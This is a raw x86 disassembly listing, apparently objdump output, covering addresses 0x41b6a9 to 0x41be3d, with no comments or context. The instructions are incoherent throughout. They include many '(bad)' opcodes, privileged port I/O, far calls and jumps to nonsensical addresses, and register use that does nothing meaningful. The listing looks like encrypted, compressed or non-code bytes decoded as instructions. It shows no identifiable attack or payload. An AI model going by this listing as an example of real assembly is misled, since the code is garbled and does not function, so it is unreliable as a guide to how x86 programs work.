  41b6a9:	xor    BYTE PTR [ebx-0x253f7792],dl
  41b6af:	arpl   WORD PTR [esi],bx
  41b6b1:	(bad)  
  41b6b2:	cmp    ch,BYTE PTR [esi+0x35]
  41b6b5:	mov    WORD PTR [edx],ds
  41b6b7:	out    0xc8,al
  41b6b9:	adc    BYTE PTR [edi],0x4d
  41b6bc:	mov    edx,0x63ea1eef
  41b6c1:	imul   esi,DWORD PTR [ebx],0x4c
  41b6c4:	adc    al,0x32
  41b6c6:	mov    edx,0xf62eaf64
  41b6cb:	frstor [edi]
  41b6cd:	std    
  41b6ce:	dec    eax
  41b6cf:	sub    eax,0x952446a0
  41b6d4:	mul    DWORD PTR [ecx+0x63]
  41b6d7:	retf   0x273a
  41b6da:	(bad)  
  41b6db:	aad    0xf2
  41b6dd:	nop
  41b6de:	fcmovne st,st(6)
  41b6e0:	sbb    ah,al
  41b6e2:	shr    DWORD PTR [esi],0xad
  41b6e5:	or     al,0x35
  41b6e7:	and    ecx,edi
  41b6e9:	mov    BYTE PTR ds:0x2874c9c5,bl
  41b6ef:	jle    0x41b680
  41b6f1:	loop   0x41b6a9
  41b6f3:	jge    0x41b68c
  41b6f5:	adc    ecx,ebp
  41b6f7:	sti    
  41b6f8:	aas    
  41b6f9:	call   0xbffcfedc
  41b6fe:	pushf  
  41b6ff:	adc    eax,DWORD PTR [esi-0x826045d]
  41b705:	test   al,0x47
  41b707:	xor    BYTE PTR [edi],ch
  41b709:	push   0xfffffffe
  41b70b:	fcmovbe st,st(1)
  41b70d:	mov    ds:0x3db1f02e,al
  41b712:	retf   
  41b713:	mov    BYTE PTR [esi-0xc6e2ddb],bh
  41b719:	or     ah,bl
  41b71b:	adc    ebx,DWORD PTR [ebx+0x4696ebe5]
  41b721:	repnz dec esi
  41b723:	ja     0x41b767
  41b725:	cmp    BYTE PTR [esi+0x5ba3cc06],dh
  41b72b:	xchg   edx,eax
  41b72c:	call   0xf31e:0x7aa25069
  41b733:	mov    esp,0x34c38e57
  41b738:	or     DWORD PTR [edi-0x518f020d],ebx
  41b73e:	(bad)  
  41b73f:	jno    0x41b79d
  41b741:	push   edx
  41b742:	test   BYTE PTR [ebp+0x4d1a3b36],al
  41b748:	mov    eax,0x4b38a55c
  41b74d:	lea    edx,[ecx-0x5f]
  41b750:	pusha  
  41b751:	xchg   ebx,eax
  41b752:	icebp  
  41b753:	fst    DWORD PTR [eax-0x1a]
  41b756:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b757:	ja     0x41b7b8
  41b759:	sub    DWORD PTR [ecx-0x1a2c99b1],esp
  41b75f:	popf   
  41b760:	fwait
  41b761:	gs and eax,esi
  41b764:	js     0x41b7c1
  41b766:	xchg   BYTE PTR [edx],ch
  41b768:	in     al,0xf3
  41b76a:	(bad)  
  41b76b:	outs   dx,BYTE PTR ds:[esi]
  41b76c:	push   ds
  41b76d:	repnz lods al,BYTE PTR ds:[esi]
  41b76f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41b770:	in     eax,dx
  41b771:	sub    eax,DWORD PTR [edx-0x74925218]
  41b777:	inc    edi
  41b778:	pop    ebx
  41b779:	(bad)  [edi+0x14]
  41b77c:	(bad)  
  41b77d:	out    0x6a,eax
  41b77f:	stos   DWORD PTR es:[di],eax
  41b781:	ffree  st(7)
  41b783:	dec    ebp
  41b784:	jae    0x41b793
  41b786:	ds ret 
  41b788:	into   
  41b789:	cdq    
  41b78a:	lock jge 0x41b803
  41b78d:	add    ecx,DWORD PTR cs:[esi+0x76e11601]
  41b794:	popa   
  41b795:	popa   
  41b796:	cmp    dh,BYTE PTR [edi]
  41b798:	add    BYTE PTR [ebp+0x7],dl
  41b79b:	fs (bad) 
  41b79e:	inc    dx
  41b7a0:	mov    eax,0x82b89eaa
  41b7a5:	in     eax,0xe4
  41b7a7:	out    0x38,eax
  41b7a9:	xor    al,0x0
  41b7ab:	mov    ds:0x7a07aa89,eax
  41b7b0:	popf   
  41b7b1:	mov    eax,ecx
  41b7b3:	out    dx,al
  41b7b4:	dec    edx
  41b7b5:	fbstp  TBYTE PTR [ebp-0x30ebbe16]
  41b7bb:	fld    TBYTE PTR [eax]
  41b7bd:	data16 lock sbb al,0x34
  41b7c1:	add    eax,0x78c9f120
  41b7c6:	mov    al,ds:0xbec3edbf
  41b7cb:	push   ecx
  41b7cc:	daa    
  41b7cd:	int    0x9d
  41b7cf:	ja     0x41b7aa
  41b7d1:	mov    ah,0xf0
  41b7d3:	mov    esi,0x17d2953
  41b7d8:	cdq    
  41b7d9:	stos   DWORD PTR es:[edi],eax
  41b7da:	xchg   edx,eax
  41b7db:	sub    al,0x5e
  41b7dd:	push   edx
  41b7de:	sar    DWORD PTR [eax-0x5518c875],cl
  41b7e4:	jmp    0x518e080
  41b7e9:	xor    al,0x6f
  41b7eb:	mov    ebp,0x1231bdbd
  41b7f0:	xor    DWORD PTR ds:[edi+0x55],esi
  41b7f4:	das    
  41b7f5:	mov    eax,ds:0x630a75af
  41b7fa:	stos   BYTE PTR es:[edi],al
  41b7fb:	int3   
  41b7fc:	xchg   edx,eax
  41b7fd:	mov    ch,0xe2
  41b7ff:	xchg   esi,eax
  41b800:	cld    
  41b801:	xor    DWORD PTR [ebx],eax
  41b803:	ss lahf 
  41b805:	loope  0x41b7eb
  41b807:	add    DWORD PTR [ebp+0x1bfca6af],edx
  41b80d:	pop    esp
  41b80e:	pop    ebp
  41b80f:	or     cl,ah
  41b811:	mov    ch,BYTE PTR [ecx-0x17]
  41b814:	pushf  
  41b815:	inc    eax
  41b816:	je     0x41b7a9
  41b818:	(bad)  
  41b81a:	adc    eax,0x474b9901
  41b81f:	clc    
  41b820:	scas   eax,DWORD PTR es:[edi]
  41b821:	adc    ecx,DWORD PTR fs:[eax+0x5d86c0e7]
  41b828:	pop    ecx
  41b829:	cdq    
  41b82a:	popa   
  41b82b:	and    al,0x19
  41b82d:	cmp    ecx,edx
  41b82f:	dec    BYTE PTR [edx-0x1d]
  41b832:	int3   
  41b833:	xchg   edi,eax
  41b834:	adc    cl,dh
  41b836:	jl     0x41b7f0
  41b838:	inc    ecx
  41b839:	and    eax,0xa1217c65
  41b83e:	ja     0x41b855
  41b840:	sub    dh,BYTE PTR [ecx]
  41b842:	cld    
  41b843:	dec    eax
  41b844:	xor    cl,ch
  41b846:	out    0x51,eax
  41b848:	je     0x41b7ef
  41b84a:	sti    
  41b84b:	sbb    BYTE PTR [ebx],ch
  41b84d:	mov    ds:0x677f47b5,al
  41b852:	mov    dh,0x66
  41b854:	(bad)  [ebx]
  41b856:	adc    bl,BYTE PTR [edx+eiz*1+0x6cecf152]
  41b85d:	push   edi
  41b85e:	icebp  
  41b85f:	(bad)  [edi+0x6e]
  41b862:	jge    0x41b804
  41b864:	fld    TBYTE PTR [ecx-0xa]
  41b867:	fucomip st,st(4)
  41b869:	mov    ebp,0x29d8270f
  41b86e:	icebp  
  41b86f:	retf   0xa366
  41b872:	shr    bl,0xe9
  41b875:	add    al,0xb3
  41b877:	and    BYTE PTR [eax],ch
  41b879:	call   0xe9f0bb51
  41b87e:	cli    
  41b87f:	inc    esi
  41b880:	or     ecx,ebp
  41b882:	sub    esi,edx
  41b884:	fst    DWORD PTR [esi+0x5b1dad31]
  41b88a:	clc    
  41b88b:	inc    esp
  41b88c:	loop   0x41b888
  41b88e:	jnp    0xc653e9d9
  41b894:	in     al,0x57
  41b896:	pusha  
  41b897:	ins    DWORD PTR es:[edi],dx
  41b898:	pushf  
  41b899:	cmp    ch,ch
  41b89b:	fst    DWORD PTR [edi+0x6141c25b]
  41b8a1:	adc    ebp,DWORD PTR [ecx-0x5336efd4]
  41b8a7:	sub    DWORD PTR [esi+0x70],ebx
  41b8aa:	gs enter 0x265e,0x33
  41b8af:	outs   dx,DWORD PTR ds:[esi]
  41b8b0:	push   0x2383d4b7
  41b8b5:	fnstsw WORD PTR [ebp-0x5b]
  41b8b8:	push   ebx
  41b8b9:	in     eax,dx
  41b8ba:	sti    
  41b8bb:	loop   0x41b8e5
  41b8bd:	adc    bh,BYTE PTR [eax]
  41b8bf:	pop    edi
  41b8c0:	das    
  41b8c1:	xlat   BYTE PTR ds:[ebx]
  41b8c2:	pop    edx
  41b8c3:	data16 xor dl,BYTE PTR [edi-0x55f1692a]
  41b8ca:	and    BYTE PTR [ebx+0x220ce107],cl
  41b8d0:	cmp    ebp,DWORD PTR [esi-0x15345a9f]
  41b8d6:	mov    ebx,0x3648baea
  41b8db:	cli    
  41b8dc:	sbb    ch,bl
  41b8de:	inc    BYTE PTR [ebx]
  41b8e0:	and    DWORD PTR ds:0x4a975dc,edx
  41b8e6:	jo     0x41b94d
  41b8e8:	cmp    DWORD PTR [edi+0x8],ebp
  41b8eb:	jle    0x41b922
  41b8ed:	adc    esi,ecx
  41b8ef:	xchg   edx,eax
  41b8f0:	push   es
  41b8f1:	mov    al,0x60
  41b8f3:	add    BYTE PTR [ebp-0x5d],ch
  41b8f6:	pop    eax
  41b8f7:	xchg   ebp,eax
  41b8f8:	mov    edx,0x70f59b
  41b8fd:	push   ds
  41b8fe:	mov    ds:0x69126ddd,eax
  41b903:	retf   0x9210
  41b906:	adc    al,0xea
  41b908:	nop
  41b909:	sub    bl,0x8e
  41b90c:	dec    edi
  41b90d:	add    eax,0xd96105ec
  41b912:	sahf   
  41b913:	lds    ebp,FWORD PTR [edx]
  41b915:	sbb    BYTE PTR [esi-0x6b],ch
  41b918:	repnz mov ebx,0x5eb7d474
  41b91e:	stc    
  41b91f:	je     0x41b8f5
  41b921:	xchg   DWORD PTR [ecx+0x67f4cd3b],ecx
  41b927:	loopne 0x41b942
  41b929:	test   BYTE PTR [esi-0x8a7f86f],ah
  41b92f:	xor    DWORD PTR [ebx+eiz*2],esp
  41b932:	adc    al,0x38
  41b934:	test   BYTE PTR [ebx],ah
  41b936:	jmp    0xa66c8795
  41b93b:	xor    ebp,esi
  41b93d:	sub    eax,0x5ceb74b9
  41b942:	je     0x41b991
  41b944:	fwait
  41b945:	out    dx,eax
  41b946:	sti    
  41b947:	push   0xffffffb7
  41b949:	stc    
  41b94a:	sti    
  41b94b:	add    esp,edi
  41b94d:	(bad)  
  41b94f:	pop    ebp
  41b950:	(bad)  
  41b951:	in     eax,0x3c
  41b953:	pop    esp
  41b954:	adc    eax,0xc3dbba1e
  41b959:	or     ebp,edx
  41b95b:	call   0xb4a67160
  41b960:	sti    
  41b961:	mov    edi,0x9020a66e
  41b966:	jecxz  0x41b9a3
  41b968:	add    eax,0x68093fa7
  41b96d:	dec    ebx
  41b96e:	mov    eax,ds:0x3f537a04
  41b973:	cmp    ebp,DWORD PTR [eax-0x1ba0e6a0]
  41b979:	(bad)  
  41b97a:	test   eax,0xe45dac0e
  41b97f:	maxps  xmm6,XMMWORD PTR [edi+ecx*4-0x58cce515]
  41b987:	shr    DWORD PTR [ebp+0x46],1
  41b98a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41b98b:	pusha  
  41b98c:	addr16 push ds
  41b98e:	sbb    edx,DWORD PTR [eax-0x3d96f260]
  41b994:	test   DWORD PTR [esi*1+0x173bf15d],edi
  41b99b:	mov    WORD PTR [eax+ebp*2-0x1f],?
  41b99f:	vpaddsb ymm0,ymm6,ymm4
  41b9a3:	cmp    ebx,DWORD PTR [edx]
  41b9a5:	mov    ah,0x30
  41b9a7:	xor    eax,0xb0915b9d
  41b9ac:	(bad)  [edx+0x67df59d]
  41b9b2:	aaa    
  41b9b3:	xlat   BYTE PTR ds:[ebx]
  41b9b4:	test   eax,0xa895de5c
  41b9b9:	dec    edi
  41b9ba:	adc    cl,BYTE PTR [ebx+ecx*4]
  41b9bd:	adc    ch,BYTE PTR [ebp-0x549cbb3]
  41b9c3:	loope  0x41ba14
  41b9c5:	mov    WORD PTR [edi+ecx*8+0x7],cs
  41b9c9:	mov    esp,DWORD PTR [ebx+0x59]
  41b9cc:	scas   eax,DWORD PTR es:[edi]
  41b9cd:	or     BYTE PTR [ecx],dl
  41b9cf:	pop    ebx
  41b9d0:	jb     0x41ba46
  41b9d2:	sbb    DWORD PTR [esi+0x3e],ebp
  41b9d5:	lea    esi,[edx-0xb]
  41b9d8:	rcl    edi,cl
  41b9da:	lock mov ds:0x2547c3aa,al
  41b9e0:	mov    al,ds:0xca622a59
  41b9e5:	fsubr  DWORD PTR [edi+0x18607f1]
  41b9eb:	mov    al,ds:0x4df4d6f4
  41b9f0:	pop    edx
  41b9f1:	clc    
  41b9f2:	in     eax,0x7
  41b9f4:	cwde   
  41b9f5:	or     BYTE PTR [edx],dl
  41b9f7:	ds sbb cl,0x57
  41b9fb:	mov    ds,WORD PTR [esi-0x31]
  41b9fe:	mov    edx,0x5311fa69
  41ba03:	fst    st(4)
  41ba05:	cmp    al,0x2c
  41ba07:	xchg   edx,eax
  41ba08:	test   BYTE PTR [ebp+eax*2+0x6c8460f0],0x3
  41ba10:	nop
  41ba11:	retf   
  41ba12:	xor    edi,DWORD PTR [esi+0x3ea96790]
  41ba18:	dec    ebp
  41ba19:	push   esp
  41ba1a:	pop    ebp
  41ba1b:	iret   
  41ba1c:	mov    ds:0x145d6253,al
  41ba21:	shr    cl,cl
  41ba23:	icebp  
  41ba24:	std    
  41ba25:	xchg   edi,eax
  41ba26:	mov    dh,al
  41ba28:	js     0x41ba1d
  41ba2a:	inc    edi
  41ba2b:	(bad)  
  41ba2c:	xchg   edx,eax
  41ba2d:	mov    BYTE PTR [ebx-0x1d],bl
  41ba30:	ficom  WORD PTR [eax+ecx*2]
  41ba33:	call   0xb433:0xd44c7df1
  41ba3a:	out    0xfc,eax
  41ba3c:	sub    eax,0x82fc523a
  41ba41:	xchg   esi,eax
  41ba42:	test   eax,0xc7260b7d
  41ba47:	pushf  
  41ba48:	std    
  41ba49:	enter  0xaa7f,0x94
  41ba4d:	cmp    ebx,ebp
  41ba4f:	mov    eax,DWORD PTR [edx+eiz*1-0x31c57621]
  41ba56:	xchg   ebx,eax
  41ba57:	lock mov cl,0x5
  41ba5a:	push   esi
  41ba5b:	loop   0x41bad8
  41ba5d:	stos   DWORD PTR es:[edi],eax
  41ba5e:	popa   
  41ba5f:	pop    es
  41ba60:	dec    ecx
  41ba61:	dec    esp
  41ba62:	mov    esp,DWORD PTR [esi]
  41ba64:	pop    es
  41ba65:	pop    eax
  41ba66:	jnp    0x41ba4c
  41ba68:	add    dl,BYTE PTR [eax+0x70023487]
  41ba6e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ba6f:	push   esp
  41ba70:	sbb    cl,al
  41ba72:	in     eax,0xf4
  41ba74:	add    eax,DWORD PTR [eax-0x68]
  41ba77:	retf   0x3d1
  41ba7a:	mov    esp,DWORD PTR [esi]
  41ba7c:	add    BYTE PTR [ecx+edi*1],0x43
  41ba80:	fdivr  QWORD PTR [esi-0x4f]
  41ba83:	push   ss
  41ba84:	test   al,0xb
  41ba86:	test   ah,ch
  41ba88:	retf   0x915d
  41ba8b:	daa    
  41ba8c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41ba8d:	push   edi
  41ba8e:	scas   eax,DWORD PTR es:[edi]
  41ba8f:	jmp    0xdb875c5a
  41ba94:	les    ebp,FWORD PTR [edx]
  41ba96:	pop    ebx
  41ba97:	mov    esp,DWORD PTR [ecx]
  41ba99:	cmc    
  41ba9a:	add    ch,ch
  41ba9c:	lds    ebp,FWORD PTR [esi-0x2e045ae1]
  41baa2:	xchg   ecx,eax
  41baa3:	jge    0x41baf2
  41baa5:	dec    edi
  41baa6:	jae    0x41ba54
  41baa8:	push   esp
  41baa9:	in     eax,0xd6
  41baab:	sub    eax,ebx
  41baad:	ficom  WORD PTR [esi]
  41baaf:	jne    0x41bae2
  41bab1:	inc    edi
  41bab2:	fiadd  DWORD PTR [ebx]
  41bab4:	arpl   ax,bp
  41bab6:	sub    esp,esp
  41bab8:	fidivr DWORD PTR [edx]
  41baba:	mov    dh,0x21
  41babc:	jmp    0x41ba73
  41babe:	les    edi,FWORD PTR [edx-0x5c2706b1]
  41bac4:	mov    al,0x14
  41bac6:	push   ecx
  41bac7:	xchg   edi,eax
  41bac8:	rcr    DWORD PTR [ebp+0x4a],cl
  41bacb:	xchg   esi,eax
  41bacc:	sub    al,bh
  41bace:	add    DWORD PTR [ebx-0x6a],eax
  41bad1:	xchg   BYTE PTR [edi+0x2f],ch
  41bad4:	bound  ecx,QWORD PTR [ecx]
  41bad6:	jnp    0x41ba60
  41bad8:	xchg   edi,eax
  41bad9:	rcr    BYTE PTR [esi+0x57],0x9c
  41badd:	ins    BYTE PTR es:[edi],dx
  41bade:	sub    eax,0x3aa2637e
  41bae3:	ins    DWORD PTR es:[edi],dx
  41bae4:	push   edi
  41bae5:	mov    bl,0x6e
  41bae7:	aas    
  41bae8:	ret    0xd38e
  41baeb:	(bad)  
  41baed:	pop    eax
  41baee:	push   esi
  41baef:	mov    bh,0xc6
  41baf1:	retf   
  41baf2:	mov    esi,0xc1cf76ae
  41baf7:	dec    edi
  41baf8:	(bad)  
  41baf9:	out    dx,eax
  41bafa:	cdq    
  41bafb:	and    BYTE PTR [esi-0x6a],0x53
  41baff:	fstp   DWORD PTR [edi+0x1a]
  41bb02:	stos   BYTE PTR es:[edi],al
  41bb03:	mov    dl,0xb
  41bb05:	shl    eax,cl
  41bb07:	adc    DWORD PTR ds:0x51327af4,ecx
  41bb0d:	adc    al,0xef
  41bb0f:	inc    ecx
  41bb10:	inc    ebx
  41bb11:	daa    
  41bb12:	call   0x82d85af6
  41bb17:	or     dl,BYTE PTR [ebx-0x5d]
  41bb1a:	jbe    0x41bb28
  41bb1c:	scas   al,BYTE PTR es:[edi]
  41bb1d:	test   al,0x8
  41bb1f:	fsub   DWORD PTR [edi-0x17]
  41bb22:	adc    al,dh
  41bb24:	in     al,dx
  41bb25:	enter  0x5dde,0x63
  41bb29:	shr    BYTE PTR [ecx+eax*4-0x63eeb7fb],0x74
  41bb31:	jmp    0xc50f:0x5ed8b99c
  41bb38:	hlt    
  41bb39:	gs nop
  41bb3b:	mov    al,fs:0xbccf10db
  41bb41:	aaa    
  41bb42:	cmp    eax,0x642cdf91
  41bb47:	push   edi
  41bb48:	test   BYTE PTR [ebx-0x2517a5f],bh
  41bb4e:	xchg   BYTE PTR [esi],ah
  41bb50:	or     DWORD PTR [edi-0x7],esp
  41bb53:	mov    edx,DWORD PTR [edi+0x14]
  41bb56:	fwait
  41bb57:	push   esi
  41bb58:	js     0x41bb19
  41bb5a:	sub    al,0xe5
  41bb5c:	and    al,0xa0
  41bb5e:	jg     0x41bb4b
  41bb60:	push   cs
  41bb61:	sbb    ch,BYTE PTR [edi-0x3e]
  41bb64:	jae    0x41bb55
  41bb66:	aaa    
  41bb67:	cs lahf 
  41bb69:	push   0x52
  41bb6b:	dec    esi
  41bb6c:	xor    DWORD PTR ds:0xcb0da07,ebx
  41bb72:	stos   BYTE PTR es:[edi],al
  41bb73:	sub    eax,0x7d9b189f
  41bb78:	pop    esp
  41bb79:	daa    
  41bb7a:	and    DWORD PTR [ecx],ebp
  41bb7c:	in     al,dx
  41bb7d:	inc    esi
  41bb7e:	inc    edi
  41bb7f:	push   ebx
  41bb80:	icebp  
  41bb81:	jle    0x41bc00
  41bb83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41bb84:	jmp    0x41bb94
  41bb86:	call   0xe059:0xde888511
  41bb8d:	ret    0x998a
  41bb90:	es dec eax
  41bb92:	(bad)  
  41bb93:	call   DWORD PTR [edi+esi*8+0x1a]
  41bb97:	xchg   edi,eax
  41bb98:	push   edx
  41bb99:	popa   
  41bb9a:	out    0xad,al
  41bb9c:	out    dx,al
  41bb9d:	test   ax,0x4894
  41bba1:	shl    ebx,1
  41bba3:	cmp    eax,eax
  41bba5:	add    BYTE PTR [ecx+0x150c308c],0x49
  41bbac:	fidiv  DWORD PTR [ebx-0x1a71135b]
  41bbb2:	and    DWORD PTR [ebp+0x59],esp
  41bbb5:	fstp   TBYTE PTR [ebp-0x6f2706be]
  41bbbb:	call   FWORD PTR [ebp+0x7e]
  41bbbe:	jnp    0x41bbff
  41bbc0:	add    BYTE PTR [ebp-0x62],al
  41bbc3:	mov    ah,0xba
  41bbc5:	out    dx,eax
  41bbc6:	push   esi
  41bbc7:	sub    ecx,DWORD PTR ds:0x2d8b9e23
  41bbcd:	mov    al,0x19
  41bbcf:	ds jns 0x41bc12
  41bbd2:	mov    ds:0x20415a70,al
  41bbd7:	adc    BYTE PTR [ecx+eiz*8-0x12],bh
  41bbdb:	inc    ebx
  41bbdc:	(bad)  
  41bbdd:	adc    DWORD PTR [eax],ebx
  41bbdf:	repnz bound ecx,QWORD PTR [eax+0x7c]
  41bbe3:	push   cs
  41bbe4:	cmp    DWORD PTR [esi+0x31],esp
  41bbe7:	jmp    0x41bbfa
  41bbe9:	xchg   BYTE PTR [edi],al
  41bbeb:	push   ecx
  41bbec:	es leave 
  41bbee:	pop    esp
  41bbef:	mov    edx,0xc2bb50b0
  41bbf4:	sub    ecx,DWORD PTR [ebx]
  41bbf6:	imul   edx,DWORD PTR [esi],0xfec434
  41bbfc:	sbb    ebp,eax
  41bbfe:	jbe    0x41bc0d
  41bc00:	pop    edi
  41bc01:	rcl    DWORD PTR [eax-0x4e],0x59
  41bc05:	push   0xffffffc8
  41bc07:	sub    eax,0xeebb43ef
  41bc0c:	lods   al,BYTE PTR ds:[esi]
  41bc0d:	push   edx
  41bc0e:	pusha  
  41bc0f:	jl     0x41bbe5
  41bc11:	cli    
  41bc12:	fwait
  41bc13:	push   0xffffff8a
  41bc15:	leave  
  41bc16:	ds int 0xf7
  41bc19:	sbb    eax,0xdca2bc5a
  41bc1e:	aad    0xbb
  41bc20:	sbb    bl,BYTE PTR [ecx-0x267d293b]
  41bc26:	mov    edx,0xb66c3a80
  41bc2b:	cli    
  41bc2c:	scas   eax,DWORD PTR es:[edi]
  41bc2d:	push   es
  41bc2e:	push   esi
  41bc2f:	clc    
  41bc30:	jbe    0x41bc9c
  41bc32:	mov    BYTE PTR [edx-0x526247],0x49
  41bc39:	fcomp  QWORD PTR [ebp+esi*1+0x11]
  41bc3d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41bc3e:	or     ebx,DWORD PTR [ebp-0x31e1f2c6]
  41bc44:	push   eax
  41bc45:	pop    edi
  41bc46:	push   ecx
  41bc47:	(bad)  
  41bc48:	mov    ah,0x15
  41bc4a:	out    0xc0,eax
  41bc4c:	mov    bh,0xa0
  41bc4e:	sbb    ebx,ecx
  41bc50:	mov    edi,0xb5ddd7fe
  41bc55:	test   eax,0xe77b85
  41bc5a:	push   cs
  41bc5b:	cli    
  41bc5c:	mov    ecx,edx
  41bc5e:	xor    ecx,DWORD PTR [ebp+0x66]
  41bc61:	xor    edi,ebp
  41bc63:	mov    ah,0x80
  41bc65:	scas   al,BYTE PTR es:[edi]
  41bc66:	xchg   DWORD PTR [eax-0x8],eax
  41bc69:	shl    DWORD PTR [ebp+0x2b],0x4a
  41bc6d:	or     dh,BYTE PTR [edx]
  41bc6f:	or     bh,cl
  41bc71:	jp     0x41bcc8
  41bc73:	or     eax,0x26e67a3
  41bc78:	cmp    edx,DWORD PTR [ebx+0x750576c]
  41bc7e:	ds inc edi
  41bc80:	push   ebx
  41bc81:	xchg   ebx,eax
  41bc82:	ret    0x2a71
  41bc85:	shl    DWORD PTR [edx-0x1f],1
  41bc88:	fs mov bl,0x60
  41bc8b:	inc    eax
  41bc8c:	fcomp  QWORD PTR [esi-0x4f164ab6]
  41bc92:	jmp    0x9:0x694879e7
  41bc99:	repnz cwde 
  41bc9b:	or     eax,0xdd57fc77
  41bca0:	mov    cl,0xdc
  41bca2:	sub    DWORD PTR [edx],esp
  41bca4:	mov    edi,eax
  41bca6:	jae    0x41bd0e
  41bca8:	rcr    DWORD PTR [esi],cl
  41bcaa:	popa   
  41bcab:	adc    BYTE PTR [edi+0x78],0x39
  41bcaf:	pop    edx
  41bcb0:	adc    eax,0xdd7902c7
  41bcb5:	cs mov esp,0xa8c3165e
  41bcbb:	adc    eax,0xffffffad
  41bcbe:	xchg   ebx,eax
  41bcbf:	aaa    
  41bcc0:	mov    ch,0x9d
  41bcc2:	loopne 0x41bcb1
  41bcc4:	ja     0x41bcbf
  41bcc6:	or     DWORD PTR [edi+ecx*8],esi
  41bcc9:	or     dl,BYTE PTR [edx]
  41bccb:	in     al,0x99
  41bccd:	add    DWORD PTR [esi],ecx
  41bccf:	inc    edi
  41bcd0:	mov    dh,0x87
  41bcd2:	sti    
  41bcd3:	or     BYTE PTR [edx],al
  41bcd5:	adc    DWORD PTR [edi-0x6e],0xe2211425
  41bcdc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41bcdd:	es mov cl,0x28
  41bce0:	sti    
  41bce1:	(bad)  
  41bce3:	fwait
  41bce4:	pushf  
  41bce5:	xchg   BYTE PTR [ebp+edx*8-0x25],ah
  41bce9:	sbb    eax,0x785ac78a
  41bcee:	(bad)  
  41bcf0:	jmp    0x9d5c904a
  41bcf5:	int3   
  41bcf6:	xor    eax,0x4cf14c7e
  41bcfb:	in     al,0x71
  41bcfd:	and    edi,DWORD PTR [eax+0x219633f5]
  41bd03:	mov    ebx,DWORD PTR [edi-0xc2b724]
  41bd09:	sub    esp,ebx
  41bd0b:	adc    eax,eax
  41bd0d:	aaa    
  41bd0e:	ret    0xb883
  41bd11:	mov    esi,0x4417c558
  41bd16:	push   ss
  41bd17:	sub    al,0xdd
  41bd19:	in     eax,0xfa
  41bd1b:	xor    esi,DWORD PTR [ecx+eax*8-0x514daea7]
  41bd22:	or     eax,0x2fda372a
  41bd27:	aas    
  41bd28:	jp     0x41bd63
  41bd2a:	or     eax,0x2e4215c7
  41bd2f:	loope  0x41bcf7
  41bd31:	in     al,dx
  41bd32:	xchg   edi,eax
  41bd33:	mov    ds:0x9d8d4e96,al
  41bd38:	jmp    0x340d7d2a
  41bd3d:	push   DWORD PTR [ecx-0x2f126ec9]
  41bd43:	adc    DWORD PTR [ebp-0x4c],ebp
  41bd46:	pop    ds
  41bd47:	sahf   
  41bd48:	dec    edi
  41bd49:	or     DWORD PTR [edx+0x7c16684a],0x5f7130f3
  41bd53:	and    DWORD PTR [esi],ebx
  41bd55:	sti    
  41bd56:	adc    eax,0x8b0e2ba1
  41bd5b:	xor    eax,0x989f5752
  41bd60:	sub    DWORD PTR [ebx-0x64556f5d],esp
  41bd66:	push   cs
  41bd67:	jo     0x41bd87
  41bd69:	add    eax,0x5b79988b
  41bd6e:	imul   ebx,DWORD PTR [ebx+0x6432426e],0xffffff9b
  41bd75:	or     DWORD PTR [edi-0x22],ecx
  41bd78:	fldenv ds:0xa6c0eb43
  41bd7e:	jg     0x41bd22
  41bd80:	shl    edi,1
  41bd82:	leave  
  41bd83:	dec    esi
  41bd84:	fsub   st(6),st
  41bd86:	mov    ah,0x5d
  41bd88:	push   edx
  41bd89:	repnz repnz cmp cl,bl
  41bd8d:	mov    eax,ds:0xe14af148
  41bd92:	pop    ebx
  41bd93:	push   ebp
  41bd94:	push   0xae345029
  41bd99:	mov    dl,0x5b
  41bd9b:	and    al,al
  41bd9d:	push   ebp
  41bd9e:	cmp    eax,0x56f85d10
  41bda3:	adc    al,0xf1
  41bda5:	xor    eax,0x66200679
  41bdaa:	xor    cl,BYTE PTR [edi-0x32]
  41bdad:	dec    eax
  41bdae:	push   ebx
  41bdaf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdb0:	mov    ebp,0x9cb9bd76
  41bdb5:	push   edx
  41bdb6:	and    eax,0x73df5138
  41bdbb:	push   edx
  41bdbc:	mov    ah,0xc4
  41bdbe:	mov    eax,ds:0x726ad354
  41bdc3:	outs   dx,BYTE PTR ds:[esi]
  41bdc4:	frstor [edi+ecx*1-0x3f2445ac]
  41bdcb:	add    esi,DWORD PTR [ecx-0x254136d9]
  41bdd1:	std    
  41bdd2:	sahf   
  41bdd3:	pop    ss
  41bdd4:	dec    edx
  41bdd5:	push   0x16b15f16
  41bdda:	iret   
  41bddb:	jge    0x41bdd3
  41bddd:	repnz add ebp,edi
  41bde0:	std    
  41bde1:	jmp    0x1816ed27
  41bde6:	and    bl,dh
  41bde8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bde9:	inc    eax
  41bdea:	cmp    ecx,DWORD PTR [esi]
  41bdec:	mov    dh,0x1a
  41bdee:	call   0x1e04:0x6911b1ed
  41bdf5:	add    bl,ch
  41bdf7:	ins    BYTE PTR es:[edi],dx
  41bdf8:	push   ss
  41bdf9:	jae    0x41be04
  41bdfb:	pusha  
  41bdfc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41bdfd:	outs   dx,BYTE PTR ds:[esi]
  41bdfe:	clc    
  41bdff:	(bad)  
  41be00:	shld   DWORD PTR [eax],edi,cl
  41be03:	sar    edx,1
  41be05:	test   eax,0x1dcb26a8
  41be0a:	in     al,dx
  41be0b:	mov    edx,0xf4a76392
  41be10:	test   eax,0xa30b4240
  41be15:	cmc    
  41be16:	repnz pop esp
  41be18:	hlt    
  41be19:	add    edi,0x7
  41be1c:	push   cs
  41be1d:	sub    eax,0xae6a0280
  41be22:	fs jmp 0x1a83d2aa
  41be28:	xchg   ebx,eax
  41be29:	cs pop ebp
  41be2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41be2c:	into   
  41be2d:	(bad)  [esi+0x5f]
  41be30:	out    dx,eax
  41be31:	push   esp
  41be32:	mov    esp,0x4d6b2e8
  41be37:	sub    BYTE PTR [ebx+0x59a7f731],ch
  41be3d:	adc    esp,edx
